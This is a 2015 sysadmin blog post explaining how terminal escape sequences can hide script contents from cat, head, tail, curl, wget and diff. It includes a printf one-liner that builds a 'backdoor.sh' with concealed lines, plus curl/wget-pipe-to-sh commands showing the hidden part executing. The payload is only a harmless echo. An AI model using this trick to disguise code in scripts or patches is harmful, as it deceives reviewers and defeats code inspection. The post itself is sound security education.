---
layout: post
title: Terminal Escape Sequences - the New XSS for Admins
author:
modified:
comments: true
categories: sysadmin
excerpt: "If the terminal understands the sequence, it won't display the character-sequence, but will perform some action."
tags: [Linux, SysAdmin, Security, XSS]
image:
  url: https://cloud.githubusercontent.com/assets/1223371/9952328/ecef0a38-5df1-11e5-8b0d-5279a1bdc955.png
  alt: Terminal Escape Sequences - the New XSS for Admins
  title: Terminal Escape Sequences - the New XSS for Admins
  feature:
date: 2015-09-18T10:31:11+05:30
---

### How it technically works

* A terminal escape sequence is a special sequence of characters that is printed (like any other text).
* If the terminal understands the sequence, it won't display the character-sequence, but will perform some action.

{% highlight bash %}
$ printf '#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho doing something very nice!\n' > backdoor.sh

$ chmod +x backdoor.sh

$ cat backdoor.sh
#!/bin/bash
echo doing something very nice!

$ ./backdoor.sh
doing something evil!
{% endhighlight %}

* As you can see, our beloved 'cat' cheated on us.
* Instead of displaying the character-sequence, the escape sequence \033[XA (being X the number of times) performed some action.
* And this action moves the cursor up X times, overwriting what is above it X lines.
* But this doesn't affect only `cat`, it affects everything that interprets escape sequences.

{% highlight bash %}
$ head backdoor.sh
#!/bin/bash
echo doing something very nice!

$ tail backdoor.sh
#!/bin/bash
echo doing something very nice!

$ more backdoor.sh
#!/bin/bash
echo doing something very nice!

$ curl 127.0.0.1/backdoor.sh
#!/bin/bash
echo doing something very nice!

$ wget -qO - 127.0.0.1/backdoor.sh
#!/bin/bash
echo doing something very nice!
{% endhighlight %}

* But if we pipe it into a shell

{% highlight bash %}
$ curl -s 127.0.0.1/backdoor.sh|sh
doing something evil!

$ wget -qO - 127.0.0.1/backdoor.sh|sh
doing something evil!
{% endhighlight %}

* `diff` also interprets escape sequences and so do the resulting patches

{% highlight bash %}
$ cat backdoor.sh #evil file
#!/bin/bash
echo doing something very nice!

$ cat legit.sh #actually echoes doing something very nice!
#!/bin/bash
echo doing something very nice!

$ diff -Naur backdoor.sh legit.sh
--- backdoor.sh	2015-09-17 16:25:42.985349535 +0100
+++ legit.sh	2015-09-17 16:26:14.950158635 +0100
@@ -1,4 +1,2 @@
  #!/bin/bash
-echo doing something very nice!
+echo doing something very nice!
{% endhighlight %}

### Reference

<a href= "http://www.openwall.com/lists/oss-security/2015/09/17/5">http://www.openwall.com/lists/oss-security/2015/09/17/5</a>
<a href= "http://www.openwall.com/lists/oss-security/2015/08/11/8">http://www.openwall.com/lists/oss-security/2015/08/11/8</a>
<a href= "http://turbochaos.blogspot.ca/2014/08/journalctl-terminal-escape-injection.html">http://turbochaos.blogspot.ca/2014/08/journalctl-terminal-escape-injection.html</a>
